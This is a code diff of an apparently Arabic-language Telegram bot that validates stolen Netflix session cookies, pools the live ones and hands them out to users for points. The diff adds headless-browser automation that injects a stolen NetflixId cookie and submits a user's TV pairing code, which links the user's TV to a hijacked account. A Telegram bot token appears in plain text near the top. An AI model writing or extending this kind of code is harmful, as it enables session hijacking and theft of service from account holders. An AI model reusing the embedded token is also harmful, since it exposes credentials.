@@ -10,6 +10,7 @@ import threading
 from datetime import datetime
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from urllib3.exceptions import InsecureRequestWarning
+from playwright.sync_api import sync_playwright
 
 # --- إعدادات البوت والتوكن ---
 TOKEN = '8890151932:AAEQApHwQ4KGsKqWzkxwyJ3HRhwB7FzI808'
@@ -34,6 +35,7 @@ USED_COOKIES_HISTORY = set()
 USER_DATABASE = {}           
 BANNED_USERS = set()         
 active_scans = {}            
+user_tv_states = {}          # حفظ حالة المستخدم الذي ينتظر إدخال كود التلفاز
 
 API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 QUERY_PARAMS = {
@@ -97,20 +99,10 @@ def check_netflix_cookie_detailed(netflix_id):
             expires = account_info.get("expires")
             
             if token:
-                # استخراج معلومات الباقة لتصنيف الحساب (Premium أم Free/Basic)
                 plan_info = value_data.get("currentPlan", {}) or value_data.get("plan", {})
                 plan_name = str(plan_info).lower()
-                
-                is_premium = True
-                if "basic" in plan_name or "free" in plan_name or "ads" in plan_name:
-                    is_premium = False
-
-                return {
-                    "token": token, 
-                    "expires": expires, 
-                    "bypass": False, 
-                    "is_premium": is_premium
-                }
+                is_premium = not ("basic" in plan_name or "free" in plan_name or "ads" in plan_name)
+                return {"token": token, "expires": expires, "bypass": False, "is_premium": is_premium}
         return None
     except Exception:
         return None
@@ -154,7 +146,6 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
     live_accounts_accumulator = []
     stop_markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🛑 إيقاف الفحص", callback_data=f"stop_scan_{chat_id}"))
     
-    # رسالة الحالة الابتدائية
     initial_status_text = (
         f"⚡ **Processing Progress**\n\n"
         f"Total Cookies: {total_count}\n"
@@ -178,8 +169,6 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
             return
 
         is_duplicate = netflix_id in USED_COOKIES_HISTORY
-
-        # حساب النسبة المئوية وشريط التقدم
         progress_pct = int((index / total_count) * 100)
         progress_bar = "█" * int(progress_pct / 5) + "░" * (20 - int(progress_pct / 5))
 
@@ -220,7 +209,6 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
         else:
             dead_count += 1
 
-        # تحديث واجهة التقدم كل حسابين أو عند النهاية لتجنب ضغط الـ API
         if index % 2 == 0 or index == total_count:
             try:
                 live_status_text = (
@@ -251,12 +239,7 @@ def process_cookies_list_and_check(chat_id, netflix_ids, reply_to_message_id, so
     if not netflix_ids:
         safe_send_message(chat_id, "❌ لم يتم العثور على أي كوكيز صالحة للعمل.")
         return
-    
-    threading.Thread(
-        target=_threaded_cookies_check, 
-        args=(chat_id, netflix_ids, reply_to_message_id, source_name), 
-        daemon=True
-    ).start()
+    threading.Thread(target=_threaded_cookies_check, args=(chat_id, netflix_ids, reply_to_message_id, source_name), daemon=True).start()
 
 def send_txt_file(chat_id, accounts_list, original_filename):
     try:
@@ -279,6 +262,7 @@ def generate_main_keyboard(user_id):
     markup.row_width = 1
     
     markup.add(InlineKeyboardButton("🔍 فحص (ملف/نص/رابط)", callback_data="menu_check"))
+    markup.add(InlineKeyboardButton("📺 تفعيل شاشة TV بالكود التلقائي", callback_data="start_tv_activation"))
     
     if user_id == DEVELOPER_CHAT_ID:
         markup.add(InlineKeyboardButton("🎁 سحب رابط نتفلكس (صلاحية المطور ♾️)", callback_data="dispense_live_link"))
@@ -290,7 +274,6 @@ def generate_main_keyboard(user_id):
         markup.add(InlineKeyboardButton("📬 نفدت نقاطك! تواصل مع المطور فارس لشحن رصيدك 🫡", url=f"https://t.me/{DEVELOPER_USERNAME}"))
         
     markup.add(InlineKeyboardButton("📊 فحص المخزن والنقاط", callback_data="check_pool_status"))
-    
     if user_id == DEVELOPER_CHAT_ID:
         markup.add(InlineKeyboardButton("👑 لوحة تحكم المطور السريّة", callback_data="open_admin_panel"))
     return markup
@@ -304,7 +287,6 @@ def send_welcome(message):
         welcome_txt = "مرحباً بك في بوت نتفلكس الذكي الخاص بفارس 😉🔥\n\n🎁 كهدية ترحيبية، **تم منحك 5 نقاط مجانية** للتجربة فوراً!"
     else:
         welcome_txt = "مرحباً بك مجدداً في لوحة التحكم الخاصة بك المحدثة 👇"
-        
     bot.reply_to(message, welcome_txt, reply_markup=generate_main_keyboard(chat_id))
 
 @bot.message_handler(commands=['id'])
@@ -326,13 +308,8 @@ def add_points_command(message):
         return
     try:
         command_parts = message.text.split()
-        if message.reply_to_message:
-            target_id = message.reply_to_message.from_user.id
-            amount = int(command_parts[1])
-        else:
-            amount = int(command_parts[1])
-            target_id = int(command_parts[2])
-            
+        target_id = message.reply_to_message.from_user.id if message.reply_to_message else int(command_parts[2])
+        amount = int(command_parts[1]) if not message.reply_to_message else int(command_parts[1])
         if target_id not in USER_DATABASE: 
             USER_DATABASE[target_id] = {"points": 5, "username": "", "role": "MEMBER"}
         USER_DATABASE[target_id]["points"] += amount
@@ -350,34 +327,130 @@ def set_vip_command(message):
         if target_id not in USER_DATABASE: 
             USER_DATABASE[target_id] = {"points": 5, "username": "", "role": "MEMBER"}
         USER_DATABASE[target_id]["role"] = "VIP"
-        bot.reply_to(message, f"👑 تم ترقية المستخدم `{target_id}` إلى رتبة **VIP** بنجاح! سحب مجاني للأبد.")
+        bot.reply_to(message, f"👑 تم ترقية المستخدم `{target_id}` إلى رتبة **VIP** بنجاح!")
     except Exception:
-        bot.reply_to(message, "⚠️ الاستخدام: بالرد `/setvip` أو عادياً `/setvip [الآيدي]`")
+        bot.reply_to(message, "⚠️ الاستخدام: بالرد `/setvip`")
 
 @bot.message_handler(commands=['ban'])
 def ban_user_command(message):
     if message.chat.id != DEVELOPER_CHAT_ID: 
         return
     try:
-        command_parts = message.text.split()
-        target_id = message.reply_to_message.from_user.id if message.reply_to_message else int(command_parts[1])
+        target_id = message.reply_to_message.from_user.id if message.reply_to_message else int(message.text.split()[1])
         BANNED_USERS.add(target_id)
         bot.reply_to(message, f"🚫 تم حظر المستخدم `{target_id}` بنجاح.")
     except Exception:
-        bot.reply_to(message, "⚠️ الاستخدام: بالرد `/ban` أو عادياً `/ban [الآيدي]`")
+        bot.reply_to(message, "⚠️ الاستخدام: بالرد `/ban`")
 
 @bot.message_handler(commands=['unban'])
 def unban_user_command(message):
     if message.chat.id != DEVELOPER_CHAT_ID: 
         return
     try:
-        command_parts = message.text.split()
-        target_id = message.reply_to_message.from_user.id if message.reply_to_message else int(command_parts[1])
+        target_id = message.reply_to_message.from_user.id if message.reply_to_message else int(message.text.split()[1])
         BANNED_USERS.discard(target_id)
         bot.reply_to(message, f"🟢 تم إلغاء حظر المستخدم `{target_id}` بنجاح.")
     except Exception:
-        bot.reply_to(message, "⚠️ الاستخدام: بالرد `/unban` أو عادياً `/unban [الآيدي]`")
+        bot.reply_to(message, "⚠️ الاستخدام: بالرد `/unban`")
 
+# --- معالجة تفعيل شاشة التلفاز (TV Automation) ---
+@bot.callback_query_handler(func=lambda call: call.data == "start_tv_activation")
+@check_ban
+def tv_activation_prompt(call):
+    chat_id = call.message.chat.id
+    if not VALID_COOKIES_POOL:
+        bot.answer_callback_query(call.id, "❌ المخزن فارغ حالياً، يرجى فحص ملف كوكيز أولاً!", show_alert=True)
+        return
+    
+    user_tv_states[chat_id] = {"step": "waiting_for_code"}
+    bot.answer_callback_query(call.id)
+    bot.send_message(
+        chat_id, 
+        "📺 **تفعيل شاشة التلفاز الذكي تلقائياً**\n\n"
+        "الرجاء إرسال **كود التلفاز** الظاهر أمامك على الشاشة (في موقع `netflix.com/tv2`):",
+        parse_mode="Markdown"
+    )
+
+def execute_tv_automation(chat_id, tv_code):
+    if not VALID_COOKIES_POOL:
+        safe_send_message(chat_id, "❌ عذراً، المخزن فارغ ولا يمكن إتمام العملية.")
+        return
+
+    target_cookie = VALID_COOKIES_POOL[0]
+    safe_send_message(chat_id, "⏳ جاري الدخول بحساب شغال من المخزن وفتح صفحة التفعيل التلقائي عبر المتصفح...")
+
+    try:
+        with sync_playwright() as p:
+            browser = p.chromium.launch(headless=True)
+            context = browser.new_context()
+            
+            context.add_cookies([{
+                'name': 'NetflixId',
+                'value': target_cookie,
+                'domain': '.netflix.com',
+                'path': '/'
+            }])
+            
+            page = context.new_page()
+            page.goto("https://www.netflix.com/tv2")
+            time.sleep(3)
+            
+            cleaned_code = re.sub(r'[^a-zA-Z0-9]', '', tv_code)
+            try:
+                page.fill("input[name*='code'], input#code, input[type='text']", cleaned_code)
+            except Exception:
+                page.keyboard.type(cleaned_code)
+                
+            time.sleep(2)
+            try:
+                page.click("button:has-text('Continue'), button:has-text('Enter'), button[type='submit']")
+            except Exception:
+                page.keyboard.press("Enter")
+                
+            time.sleep(4)
+            browser.close()
+            
+            success_markup = InlineKeyboardMarkup()
+            success_markup.row_width = 2
+            success_markup.add(
+                InlineKeyboardButton("✅ نعم، اشتغل التلفاز تماماً", callback_data="tv_success_yes"),
+                InlineKeyboardButton("❌ لا، لم يعمل الكود", callback_data="tv_success_no")
+            )
+            
+            safe_send_message(
+                chat_id, 
+                f"🎉 **تم إرسال كود التلفاز (`{tv_code}`) بنجاح إلى الحساب!**\n\n"
+                f"📺 **هل ظهرت لك قائمة الحسابات أو بدأ العرض على شاشة التلفاز الآن؟**", 
+                success_markup
+            )
+
+    except Exception as e:
+        safe_send_message(chat_id, f"❌ حدث خطأ تقني أثناء محاولة الأتمتة: `{str(e)}`")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('tv_success_'))
+@check_ban
+def handle_tv_feedback(call):
+    action = call.data.split('_')[2]
+    bot.answer_callback_query(call.id)
+    if action == "yes":
+        bot.edit_message_text("✅ ممتاز جداً! مشاهدة ممتعة على التلفاز 🍿🎬", call.message.chat.id, call.message.message_id)
+    else:
+        bot.edit_message_text("⚠️ حسناً، يرجى المحاولة بكود جديد أو التأكد من صلاحية الحساب في المخزن.", call.message.chat.id, call.message.message_id)
+
+@bot.message_handler(func=lambda message: message.chat.id in user_tv_states and user_tv_states[message.chat.id]["step"] == "waiting_for_code")
+@check_ban
+def receive_tv_code_input(message):
+    chat_id = message.chat.id
+    tv_code = message.text.strip()
+    user_tv_states.pop(chat_id, None)
+    
+    if len(tv_code) < 3:
+        bot.reply_to(message, "❌ الكود قصير جداً، يرجى التأكد وإرسال كود التلفاز الصحيح.")
+        return
+        
+    threading.Thread(target=execute_tv_automation, args=(chat_id, tv_code), daemon=True).start()
+
+# --- باقي اللوجيك (سحب الحسابات، الأزرار، والملفات) ---
 def execute_dispense_logic(chat_id):
     if chat_id not in USER_DATABASE:
         USER_DATABASE[chat_id] = {"points": 5, "username": "", "role": "MEMBER"}
@@ -418,12 +491,10 @@ def execute_dispense_logic(chat_id):
             
             user_markup = InlineKeyboardMarkup()
             user_markup.row_width = 2
-            
             user_markup.add(
                 InlineKeyboardButton("💻 دخول للكمبيوتر", url=direct_netflix_url), 
-                InlineKeyboardButton("📺 تفعيل شاشة TV", url="https://www.netflix.com/tv8")
+                InlineKeyboardButton("📺 تفعيل شاشة TV", callback_data="start_tv_activation")
             )
-            user_markup.add(InlineKeyboardButton("📺 كيف أستخدم الرابط؟", callback_data="ask_how_to_use"))
             user_markup.add(
                 InlineKeyboardButton("✅ نعم، اشتغل تماماً", callback_data=f"fb_yes_{short_id}"), 
                 InlineKeyboardButton("❌ لا، لم يشتغل معي", callback_data=f"fb_no_{short_id}")
@@ -437,17 +508,6 @@ def execute_dispense_logic(chat_id):
             continue
             
     return {"status": "expired", "message": "❌ عذراً، انتهت صلاحية الكوكيز المتوفرة بالمخزن فجأة."}
-
-@bot.callback_query_handler(func=lambda call: call.data == "ask_how_to_use")
-@check_ban
-def handle_ask_method(call):
-    bot.answer_callback_query(call.id)
-    chan_markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔗 اضغط هنا لمشاهدة الطريقة", url=CHANNEL_LINK))
-    bot.send_message(
-        call.message.chat.id, 
-        "🤔 **هل تريد الطريقة؟**\n\nإذاً نعم، سوف أعطيك رابط قناتي متوفر فيها الشرح بالكامل بالتفصيل 👇", 
-        reply_markup=chan_markup
-    )
 
 @bot.callback_query_handler(func=lambda call: call.data == "dispense_live_link")
 @check_ban
@@ -474,7 +534,7 @@ def pool_status(call):
     bot.answer_callback_query(call.id)
     role = USER_DATABASE.get(chat_id, {}).get("role", "MEMBER")
     points = "♾️ (أنت صاحب البوت)" if chat_id == DEVELOPER_CHAT_ID else ("💎 وضع VIP (مفتوح)" if role == "VIP" else f"{USER_DATABASE.get(chat_id, {}).get('points', 5)} نقطة 🪙")
-    bot.send_message(chat_id, f"📦 **حالة الحساب والمخزن:**\n\n👤 رصيدك الحالي: **{points}**\n📦 إجمالي الكوكيز المتوفر بالمخزن المشترك: **{len(VALID_COOKIES_POOL)}** حساب جاهز.", reply_markup=generate_main_keyboard(chat_id))
+    bot.send_message(chat_id, f"📦 **حالة الحساب والمخزن:**\n\n👤 رصيدك الحالي: **{points}**\n📦 إجمالي الكوكيز المتوفر بالمخزن: **{len(VALID_COOKIES_POOL)}** حساب جاهز.", reply_markup=generate_main_keyboard(chat_id))
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('fb_'))
 @check_ban
@@ -482,9 +542,6 @@ def handle_user_feedback(call):
     global VALID_COOKIES_POOL
     data_parts = call.data.split('_')
     action, short_id = data_parts[1], data_parts[2]
-    
-    user_info = call.from_user
-    username = f"@{user_info.username}" if user_info.username else "لا يوجد"
     chat_id = call.message.chat.id
     
     target_cookie = None
@@ -496,30 +553,15 @@ def handle_user_feedback(call):
     if action == "yes":
         bot.answer_callback_query(call.id, "شكراً على تقييمك! مشاهدة ممتعة 🍿🔥", show_alert=True)
         try: 
-            bot.edit_message_text("✅ **شكراً واستمتع! 🎬🍿**\n\nتم تأكيد عمل الرابط بنجاح، مشاهدة ممتعة!", chat_id, call.message.message_id, reply_markup=None)
+            bot.edit_message_text("✅ **شكراً واستمتع! 🎬🍿**\n\nتم تأكيد عمل الرابط بنجاح!", chat_id, call.message.message_id, reply_markup=None)
         except Exception: 
             pass
-        
-        if target_cookie:
-            dev_log_text = f"👑 **سحب ناجح!** 👑\n👤 المستعمل: {user_info.first_name} ({username})\n🆔 الأيدي: `{user_info.id}`\n🍪 الكوكيز الفعال:\n`NetflixId={target_cookie}`"
-            try: 
-                bot.send_message(DEVELOPER_CHAT_ID, dev_log_text, parse_mode="Markdown")
-            except Exception: 
-                pass
-        
     elif action == "no":
         if target_cookie and target_cookie in VALID_COOKIES_POOL:
             VALID_COOKIES_POOL.remove(target_cookie)
-            bot.answer_callback_query(call.id, "⚠️ تم الإبلاغ وحذف الحساب التالف، جاري تعويضك فوراً...", show_alert=True)
-            try: 
-                bot.send_message(DEVELOPER_CHAT_ID, f"❌ تم حذف حساب ميت أبلغ عنه المستخدم: {user_info.first_name}\n🍪 `NetflixId={target_cookie}`")
-            except Exception: 
-                pass
-        else:
-            bot.answer_callback_query(call.id, "👌 تم تصفية هذا الحساب مسبقاً، جاري استخراج بديل لك...", show_alert=False)
-            
+            bot.answer_callback_query(call.id, "⚠️ تم الإبلاغ وحذف الحساب التالف، جاري تعويضك...", show_alert=True)
         try: 
-            bot.edit_message_text("❌ تم حذف الرابط القديم لعدم عمله! جاري سحب حساب جديد لك فوراً وخصم 1 نقطة... ⏳", chat_id, call.message.message_id, reply_markup=None)
+            bot.edit_message_text("❌ تم حذف الرابط لعدم عمله! جاري سحب حساب جديد لك... ⏳", chat_id, call.message.message_id, reply_markup=None)
         except Exception: 
             pass
 
@@ -527,59 +569,9 @@ def handle_user_feedback(call):
         if response["status"] == "success":
             bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
         elif response["status"] == "no_points":
-            bot.send_message(chat_id, "❌ رصيد نقاطك انتهى تماماً! لا يمكن تعويضك بحساب جديد تلقائياً حتى تشحن.", reply_markup=generate_main_keyboard(chat_id))
+            bot.send_message(chat_id, "❌ رصيد نقاطك انتهى تماماً!", reply_markup=generate_main_keyboard(chat_id))
         else:
             bot.send_message(chat_id, response["message"])
-
-def open_admin_panel_msg(chat_id):
-    markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("📢 إرسال إذاعة جماعية (Broadcast)", callback_data="admin_broadcast"))
-    markup.add(InlineKeyboardButton("🔄 تصفير الذاكرة والمكرر", callback_data="admin_clear_history"))
-    
-    stats_text = (
-        f"👑 **مرحباً بك يا مطور البوت (فارس) في لوحتك السرية** 👑\n\n"
-        f"📊 **إحصائيات البوت اللحظية:**\n"
-        f"👥 إجمالي المستخدمين المسجلين: {len(USER_DATABASE)}\n"
-        f"📦 إجمالي الحسابات الشغالة بالمخزن: {len(VALID_COOKIES_POOL)}\n"
-        f"🚫 إجمالي المحظورين: {len(BANNED_USERS)}\n"
-        f"✂️ إجمالي الكوكيز في مانع التكرار: {len(USED_COOKIES_HISTORY)}"
-    )
-    bot.send_message(chat_id, stats_text, reply_markup=markup)
-
-@bot.callback_query_handler(func=lambda call: call.data == "open_admin_panel")
-def handle_admin_click(call):
-    if call.message.chat.id == DEVELOPER_CHAT_ID:
-        bot.answer_callback_query(call.id)
-        open_admin_panel_msg(call.message.chat.id)
-
-@bot.callback_query_handler(func=lambda call: call.data == "admin_broadcast")
-def start_broadcast_process(call):
-    bot.answer_callback_query(call.id)
-    msg = bot.send_message(DEVELOPER_CHAT_ID, "📢 أرسل لي الآن الرسالة التي تريد إذاعتها لجميع مستخدمي البوت فوراً:")
-    bot.register_next_step_handler(msg, process_broadcast_sending)
-
-def process_broadcast_sending(message):
-    if message.chat.id != DEVELOPER_CHAT_ID: 
-        return
-    broadcast_text = message.text
-    sent_count = 0
-    bot.send_message(DEVELOPER_CHAT_ID, "⏳ جاري بدء الإذاعة ونشر الرسالة لجميع المشتركين...")
-    
-    for u_id in list(USER_DATABASE.keys()):
-        try:
-            bot.send_message(u_id, f"📢 **إعلان من إدارة البوت:**\n\n{broadcast_text}", parse_mode="Markdown")
-            sent_count += 1
-            time.sleep(0.05)
-        except Exception: 
-            pass
-            
-    bot.send_message(DEVELOPER_CHAT_ID, f"✅ تمت الإذاعة بنجاح! تم تسليم الرسالة إلى {sent_count} مستخدم نشط 🚀")
-
-@bot.callback_query_handler(func=lambda call: call.data == "admin_clear_history")
-def clear_history_action(call):
-    global USED_COOKIES_HISTORY
-    USED_COOKIES_HISTORY.clear()
-    bot.answer_callback_query(call.id, "✅ تم مسح تاريخ التكرار بنجاح لإتاحة فحص الملفات القديمة مجدداً.", show_alert=True)
 
 def unzip_and_extract_ids(zip_path, extract_to, password=None):
     try:
@@ -594,8 +586,7 @@ def unzip_and_extract_ids(zip_path, extract_to, password=None):
                     file_path = os.path.join(root, file)
                     try:
                         with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                            content = f.read()
-                            for nid in extract_clean_netflix_ids(content):
+                            for nid in extract_clean_netflix_ids(f.read()):
                                 if nid not in all_cookies: 
                                     all_cookies.append(nid)
                     except Exception:
@@ -636,7 +627,7 @@ def process_zip_entry(message, file_path, password=None, password_msg_id=None, o
             markup = InlineKeyboardMarkup()
             buttons = [InlineKeyboardButton(pwd, callback_data=f"fanal_{pwd}_{file_path}_{original_name}") for pwd in COMMON_PASSWORDS]
             markup.add(*buttons)
-            bot.send_message(chat_id, "⚠️ الملف المضغوط محمي بكلمة مرور! اختر كلمة المرور الشائعة للمتابعة أو الفك الفوري:", reply_markup=markup)
+            bot.send_message(chat_id, "⚠️ الملف المضغوط محمي بكلمة مرور! اختر كلمة المرور للمتابعة:", reply_markup=markup)
     else: 
         bot.send_message(chat_id, f"❌ حدث خطأ أثناء المعالجة: {error_type}")
 
@@ -672,7 +663,7 @@ def handle_stop_button(call):
     target_chat_id = int(call.data.split('_')[2])
     if target_chat_id in active_scans:
         active_scans[target_chat_id] = False
-        bot.answer_callback_query(call.id, "🛑 جاري إيقاف عملية الفحص الحالية بناءً على طلبك...")
+        bot.answer_callback_query(call.id, "🛑 جاري إيقاف الفحص...")
         try: 
             bot.edit_message_reply_markup(target_chat_id, call.message.message_id, reply_markup=None)
         except Exception: 
@@ -683,15 +674,13 @@ def handle_stop_button(call):
 def handle_plain_text(message):
     text_content = message.text
     extracted_ids = extract_clean_netflix_ids(text_content)
-    
     if not extracted_ids:
-        bot.reply_to(message, "❌ لم يتم العثور على أي كوكيز نتفلكس صالحة داخل النص المرسل. تأكد من صحة التنسيق.")
+        bot.reply_to(message, "❌ لم يتم العثور على أي كوكيز نتفلكس صالحة داخل النص المرسل.")
         return
-        
     process_cookies_list_and_check(message.chat.id, extracted_ids, message.message_id, source_name="Combo_Text.txt")
 
 if __name__ == "__main__":
-    print("🚀 تم تشغيل البوت بنجاح وهو نظيف تماماً وخالٍ من الاشتراكات الإجبارية والقنوات...")
+    print("🚀 تم تشغيل البوت بنجاح وبجميع الميزات المطلوبة (الفحص، التقسيم، وشاشة TV)!")
     while True:
         try: 
             bot.polling(none_stop=True, skip_pending=True)
